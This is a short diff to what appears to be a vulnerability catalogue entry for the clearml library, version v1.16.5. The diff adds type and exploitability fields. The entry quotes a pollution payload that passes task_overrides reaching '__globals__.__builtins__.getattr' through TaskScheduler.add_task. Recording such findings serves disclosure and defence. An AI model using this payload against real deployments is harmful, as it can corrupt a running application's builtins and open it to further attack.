@@ -3,6 +3,7 @@
 ### Meta
 
 + Library: clearml
++ Type: App
 + Stars: 5.7K
 + Version: v1.16.5
 + CVE: N/A
@@ -10,6 +11,7 @@
 + Payload: ```clearml.automation.TaskScheduler.add_task(task_overrides={'__init__.__globals__.__builtins__.getattr': 'polluted'})```
 + Foundby: BlackPyrl
 + Report: Pending
++ Exploitability: Low
 
 ### Library
 
